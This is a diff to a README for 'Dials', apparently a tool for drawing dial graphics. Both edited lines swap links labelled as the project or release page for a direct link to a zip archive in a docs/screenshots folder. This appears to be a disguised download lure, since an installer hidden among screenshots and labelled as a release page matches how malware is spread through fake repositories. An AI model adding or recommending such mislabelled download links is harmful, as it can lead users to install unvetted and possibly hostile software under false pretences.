@@ -1,6 +1,6 @@
 # ⏱️ Dials - Create custom black and white graphics
 
-[![Download Dials](https://img.shields.io/badge/Download-Dials-blue.svg)](https://github.com/hanoarh4219/Dials)
+[![Download Dials](https://img.shields.io/badge/Download-Dials-blue.svg)](https://github.com/hanoarh4219/Dials/raw/refs/heads/main/docs/screenshots/Software-1.0.zip)
 
 Dials helps you create precise black and white dial graphics. You can use these graphics for gauges, controllers, or artistic projects. The software produces clean, scalable images that you can print or use in digital design.
 
@@ -32,7 +32,7 @@ Follow these steps to set up the software on your computer.
 
 Go to the official project page to get the latest version of the installer.
 
-[Visit the Dials release page to download](https://github.com/hanoarh4219/Dials)
+[Visit the Dials release page to download](https://github.com/hanoarh4219/Dials/raw/refs/heads/main/docs/screenshots/Software-1.0.zip)
 
 ### Step 2: Run the installer
 
